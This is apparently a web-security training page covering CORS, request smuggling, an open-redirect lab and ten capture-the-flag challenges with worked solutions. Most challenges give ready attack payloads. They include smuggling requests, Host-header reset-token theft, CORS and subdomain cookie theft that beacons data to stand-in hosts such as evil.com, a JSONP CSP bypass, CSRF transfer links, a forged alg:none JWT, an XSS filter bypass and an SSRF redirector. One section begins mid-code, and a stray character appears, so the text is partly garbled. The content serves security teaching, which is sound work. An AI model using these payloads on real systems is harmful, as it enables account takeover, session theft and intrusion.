CORS (Cross-Origin Resource Sharing)

Same-Origin Policy

Two URLs have the same origin if protocol, hostname, AND port all match. Cross-origin requests are blocked by default.

http://example.com/page    vs   http://example.com/other     ✓ Same origin
http://example.com         vs   https://example.com          ✗ Different scheme
http://example.com         vs   http://sub.example.com       ✗ Different host
http://example.com         vs   http://example.com:8080      ✗ Different port

CORS Headers

HeaderDirectionPurpose
OriginRequestBrowser-set: requesting origin
Access-Control-Allow-OriginResponseWhich origins can read the response (* or specific origin)
Access-Control-Allow-CredentialsResponsetrue — allows cookies/auth headers (cannot use * for origin)
Access-Control-Allow-MethodsResponseAllowed methods for preflight
Access-Control-Allow-HeadersResponseAllowed request headers for preflight
Access-Control-Expose-HeadersResponseResponse headers JS can read

HTTP Request Smuggling

Exploits discrepancies between how front-end (proxy/CDN) and back-end servers parse HTTP request boundaries.

CL.TE (Content-Length vs Transfer-Encoding)

POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

Front-end uses Content-Length (reads 13 bytes). Back-end uses Transfer-Encoding chunked (sees 0\r\n\r\n as end). "SMUGGLED" becomes the start of the next request on the back-end.

TE.CL

POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

    next_url = request.args.get('next', '/')
    # Open redirect! No validation on next_url
    return redirect(next_url)

@app.route('/dashboard')
def dashboard():
    return 'Dashboard. Your token was in the URL.'

app.run(port=5000)
# Attack: redirect to attacker site, token leaks via Referer
# Victim clicks:
# http://localhost:5000/callback?token=SECRET&next=https://evil.com/steal

# evil.com receives the Referer header containing the token:
# Referer: http://localhost:5000/callback?token=SECRET&next=...

Tasks:

  1. Confirm the redirect works: /callback?next=/dashboard.
  2. Set next=https://your-server.com and observe the redirect to your domain.
  3. Check if the Referer header on your server contains the full URL (including token param).
  4. Fix: validate next against an allowlist, and use Referrer-Policy: no-referrer.

CTF Challenges

Challenge 1: Header Injection for Account Takeover

Medium

A password reset endpoint sends the reset link using the Host header value. Inject a custom Host to redirect the reset link to your server. Flag is in the reset token.

# Normal request:
POST /forgot-password HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com

# Server sends email with: https://{Host}/reset?token=SECRET
# Inject Host header:
Host: evil.com

Send the forgot-password request with Host: your-server.com. The application generates a reset link using the Host header value: https://your-server.com/reset?token=FLAG{...}. Check your server logs for the incoming request with the token. Some apps also accept X-Forwarded-Host for this.

Challenge 2: CORS Token Theft

Medium

The API at /api/me returns user data including a flag. It reflects the Origin header in ACAO with credentials. Steal the data from a cross-origin page.

// Your exploit page (hosted on attacker origin):
fetch('https://vulnerable.com/api/me', {credentials: 'include'})
  .then(r => r.json())
  .then(d => /* exfiltrate d.flag */);
// FLAG{c0rs_r3fl3ct10n_cr3d3nt14ls}

The server sets Access-Control-Allow-Origin to whatever Origin you send, plus Access-Control-Allow-Credentials: true. Host an HTML page on your domain that fetches the API with credentials: 'include'. The victim's cookies are sent, and you can read the response because CORS allows it.

Challenge 3: HTTP Smuggling to Admin

Hard

The front-end proxy blocks /admin. Smuggle a request past the proxy to access the admin endpoint on the back-end. Flag is in the admin response.

# CL.TE smuggling payload:
POST / HTTP/1.1
Host: target.com
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

The front-end uses Content-Length (reads 37 bytes including the smuggled portion). The back-end uses Transfer-Encoding chunked (sees 0\r\n\r\n as end of first request). The GET /admin becomes a new request on the back-end that bypasses the front-end's path-based blocking. Send this twice — the second response will be the admin page.

Challenge 4: Cookie Scope Exploitation

Easy

A cookie is set with Domain=.target.com. You control evil.target.com (subdomain takeover). Read the victim's cookie from your subdomain. Flag format: FLAG{cookie_value}.

// On evil.target.com (which you control):
// Cookies with Domain=.target.com are sent to ALL subdomains
console.log(document.cookie);  // Contains the parent domain's cookies!
// Exfiltrate
navigator.sendBeacon('https://your-server.com/steal', document.cookie);

When a cookie is set with Domain=.target.com, it's sent to target.com AND all subdomains (sub.target.com, evil.target.com, etc.). If you can claim an unclaimed subdomain (via dangling DNS CNAME → subdomain takeover), you receive those cookies. The cookie value IS the flag.

Challenge 5: CSP Bypass via JSONP

Hard

The page has a strict CSP: script-src 'self' https://apis.google.com. Find a JSONP endpoint on the allowed domain to execute arbitrary JS. Flag is in /api/secret (same-origin).

<!-- CSP allows scripts from https://apis.google.com -->
<!-- Google has JSONP endpoints that reflect callbacks -->
<script src="https://apis.google.com/some/endpoint?callback=alert"></script>
<!-- Response: alert({...}) — executes your function! -->

<!-- Craft callback to steal data: -->
<script src="https://apis.google.com/endpoint?callback=fetch('/api/secret').then(r=>r.text()).then(d=>navigator.sendBeacon('https://evil.com',d));//"></script>

JSONP endpoints wrap their response in a callback function: callbackName({data}). If you control the callback name and the endpoint is on a CSP-allowed origin, you can execute arbitrary JavaScript. Look for ?callback= parameters on the allowed domains. Google, Facebook, and many CDNs have exploitable JSONP endpoints.

Challenge 6: Web Cache Deception

Medium

Trick the cache into storing an authenticated page by appending a static file extension to the URL. Flag is in the victim's profile page.

# Normal: /profile returns user-specific content (not cached)
# Attack: /profile/anything.css
#   Server: path normalization → serves /profile (ignores suffix)
#   Cache: sees .css extension → caches as static asset
#   Attacker: fetches /profile/anything.css → gets victim's profile from cache

# Step 1: Trick victim into visiting /profile/x.css (via link)
# Step 2: Wait for cache to store it
# Step 3: Fetch /profile/x.css yourself → cached victim data

The cache uses the URL extension to decide cacheability (`.css`, `.js`, `.png` = static = cache it). The application server uses path normalization and ignores the appended filename. Send the victim a link to /profile/anything.css. Their authenticated profile gets cached. Then fetch that same URL — the cache serves you their data.

Challenge 7: SameSite Cookie Bypass

Medium

The session cookie uses SameSite=Lax. Find a way to perform CSRF despite this protection. Flag is the result of a successful state-changing action.

<!-- SameSite=Lax allows cookies on top-level GET navigations -->
<!-- If the endpoint accepts GET for state changes... -->

<!-- Method 1: Top-level navigation (opens in same tab) -->
<a href="https://target.com/api/delete?confirm=true">Click me</a>

<!-- Method 2: window.open (top-level navigation) -->
<script>window.open('https://target.com/api/transfer?to=attacker&amount=1000')</script>

<!-- Method 3: Meta refresh redirect -->
<meta http-equiv="refresh" content="0;url=https://target.com/api/action">

SameSite=Lax sends cookies on top-level GET navigations (clicking links, redirects, window.open). If the target endpoint performs a state change on GET (bad practice but common), CSRF is still possible via link click or redirect. The key is: it must be a top-level navigation, not a fetch/XHR/iframe.

Challenge 8: JWT None Algorithm

Easy

The API uses JWT for auth but accepts "alg": "none". Forge a token with admin role. Flag is at /api/admin.

// Original token (decoded): {"alg":"HS256"}.{"user":"guest","role":"user"}.signature
// Forge token with alg:none — no signature needed!
let header = btoa(JSON.stringify({"alg":"none","typ":"JWT"}));
let payload = btoa(JSON.stringify({"user":"admin","role":"admin"}));
let forged = header + '.' + payload + '.';  // Empty signature
// Use: Authorization: Bearer <forged>

Many JWT libraries accept "alg": "none" which means no signature verification. Craft a token with the header {"alg":"none","typ":"JWT"} and payload {"user":"admin","role":"admin"}. Base64url-encode each part and join with dots. The signature part is empty (just a trailing dot). Send it in the Authorization header.

Challenge 9: HTTP Parameter Pollution

Medium

The server and WAF handle duplicate parameters differently. The WAF checks the first value, but the app uses the last. Bypass the WAF to inject a malicious parameter value.

# WAF behavior: uses FIRST value of duplicate param
# App behavior: uses LAST value of duplicate param

# Normal (blocked):
GET /search?q=<script>alert(1)</script>  → WAF blocks

# HPP bypass:
GET /search?q=safe&q=<script>alert(1)</script>
# WAF sees q=safe (first) → allows
# App uses q=<script>alert(1)</script> (last) → XSS!

Different servers handle duplicate parameters differently: PHP uses last, ASP.NET concatenates with comma, Python/Flask uses first, Java/Spring uses first. The WAF and application may be on different stacks. Test by sending ?param=A¶m=B and seeing which value the application uses. If the WAF checks one and the app uses another, you can bypass filters.

Challenge 10: 302 Redirect SSRF

Hard

The server fetches a URL you provide but blocks internal IPs (127.0.0.1, 10.x, etc.). Use a redirect to bypass the filter and hit an internal service. Flag is at http://127.0.0.1:6379/flag.

# Attack server (redirector.py) — hosted on your public server
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/redirect')
def redir():
    # Server fetches this URL, passes IP check (your server is public)
    # Then follows redirect to internal IP
    return redirect('http://127.0.0.1:6379/flag')

app.run(host='0.0.0.0', port=80)

# Victim server fetches:
# 1. http://your-server.com/redirect  → passes IP allowlist
# 2. Follows 302 → http://127.0.0.1:6379/flag  → internal access!

The server validates the initial URL but follows redirects without re-checking. Host a server that responds with 302 Location: http://127.0.0.1:6379/flag. Other bypasses: DNS rebinding (DNS resolves to public IP first, then internal IP on second lookup), IPv6 mapped addresses (http://[::1]/), or decimal IP notation (http://2130706433/ = 127.0.0.1).
